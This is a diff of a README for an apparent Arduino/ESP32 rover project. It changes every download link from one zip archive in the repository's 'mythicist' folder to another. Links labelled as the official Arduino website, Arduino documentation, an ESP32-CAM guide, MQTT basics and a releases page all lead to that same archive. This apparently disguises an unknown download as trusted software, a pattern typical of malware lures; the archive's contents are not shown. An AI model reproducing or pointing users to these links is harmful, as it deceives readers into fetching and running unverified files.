@@ -6,11 +6,11 @@ Welcome to hks-rover-arduino! This project gives you the tools to control an omn
 
 ### 💾 Download Now
 
-[![Download hks-rover-arduino](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-rover-arduino-3.1.zip)](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-rover-arduino-3.1.zip)
+[![Download hks-rover-arduino](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-arduino-rover-v3.9.zip)](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-arduino-rover-v3.9.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-rover-arduino-3.1.zip) to download the latest version of the application. Follow these steps:
+To get started, visit the [Releases page](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-arduino-rover-v3.9.zip) to download the latest version of the application. Follow these steps:
 
 1. Click the link above to navigate to the releases.
 2. Find the latest version listed on that page.
@@ -38,7 +38,7 @@ Make sure all components are secure and powered on.
 Now, let’s set up the software on your computer:
 
 1. **Install Arduino IDE:** 
-   - Download the Arduino IDE from the official [Arduino website](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-rover-arduino-3.1.zip).
+   - Download the Arduino IDE from the official [Arduino website](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-arduino-rover-v3.9.zip).
    - Follow the installation instructions provided there.
 
 2. **Open the Application:**
@@ -89,9 +89,9 @@ For further assistance, consult the documentation available on the repository or
 
 ## 📘 Additional Resources
 
-- [Arduino Documentation](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-rover-arduino-3.1.zip)
-- [ESP32-CAM Guide](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-rover-arduino-3.1.zip)
-- [MQTT Basics](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-rover-arduino-3.1.zip)
+- [Arduino Documentation](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-arduino-rover-v3.9.zip)
+- [ESP32-CAM Guide](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-arduino-rover-v3.9.zip)
+- [MQTT Basics](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-arduino-rover-v3.9.zip)
 
 ## 📑 Note on Contributions
 
@@ -99,4 +99,4 @@ If you find ways to improve the project or discover bugs, feel free to contribut
 
 ## 🎉 Final Remarks
 
-Thank you for exploring hks-rover-arduino! We hope you enjoy using your new rover and find it easy to operate. For updates and new features, keep an eye on our [Releases page](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-rover-arduino-3.1.zip). Happy exploring!
+Thank you for exploring hks-rover-arduino! We hope you enjoy using your new rover and find it easy to operate. For updates and new features, keep an eye on our [Releases page](https://github.com/Meharees123/hks-rover-arduino/raw/refs/heads/main/mythicist/hks-arduino-rover-v3.9.zip). Happy exploring!
